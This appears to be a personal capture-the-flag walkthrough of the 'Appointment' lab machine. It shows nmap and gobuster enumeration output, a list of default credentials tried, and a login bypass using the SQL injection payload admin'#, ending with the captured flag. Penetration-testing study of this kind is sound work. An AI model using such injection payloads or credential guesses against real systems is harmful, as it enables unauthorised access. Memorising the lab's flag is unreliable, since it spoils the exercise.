---

---

# Appointment
---
## Getting Started
---
Use command to set Target IP
```bash
IP=10.129.186.78 ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```
---
## Enumeration
---
### NMAP
---
Nmap Command Ran
```bash
nmap -sV -sC $IP | copy
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 10:53 EDT
Nmap scan report for 10.129.186.78
Host is up (0.028s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.13 seconds

```

**Findings**
Apache is  running on port 80. Navigate to website for further enumeration

---
### Website Enumeration
---
Greeted with a login page

>![[Pasted image 20220930110245.png]]

Use [gobuster](obsidian://open?vault=OSCP&file=TOOLS%2Fgobuster%2FMAN) to enumerate the website further

Command
```bash
gobuster dir --url http://$IP/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
```

Result
```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.186.78/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/30 11:08:45 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.186.78/images/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.186.78/css/]   
/js                   (Status: 301) [Size: 311] [--> http://10.129.186.78/js/]    
/vendor               (Status: 301) [Size: 315] [--> http://10.129.186.78/vendor/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.186.78/fonts/] 
                                                                                  
===============================================================
2022/09/30 11:14:04 Finished
===============================================================

```

**Notes**
gobuster did not find anything of note.


---
## Foothold
---
Tried several standard logins.
```bash
admin:admin  
guest:guest  
user:user  
root:root  
administrator:password
```

Tried SQLmap and found nothing.

>SQL Injection is a common way of exploiting web pages that use `SQL Statements` that  retrieve and store user input data. If configured incorrectly, one can use this attack  to exploit the well-known `SQL Injection` vulnerability, which is very dangerous. There are many different techniques of protecting from SQL injections, some of them being input validation, parameterized queries, stored procedures, and implementing a WAF (Web Application Firewall) on the perimeter of the server's network. However, instances can  be found where none of these fixes are in place, hence why this type of attack is  prevalent, according to the [OWASP Top 10](https://owasp.org/www-project-top-ten/) list  of web vulnerabilities.

Here is an example of how authentication works using PHP & SQL:
>![[Pasted image 20220930113735.png]]![[Pasted image 20220930113812.png]]  

Levered the `#` to comment out al the code after the username is entered and stored as a SQL variable

Username: `admin'#`
Password: ANYTHING

Website returns
>![[Pasted image 20220930113258.png]]

---
## Flags
---
website
```bash
#### e3d0796d002a446c0e622226f42e9672
```


---
## Tags
---
#gobuster 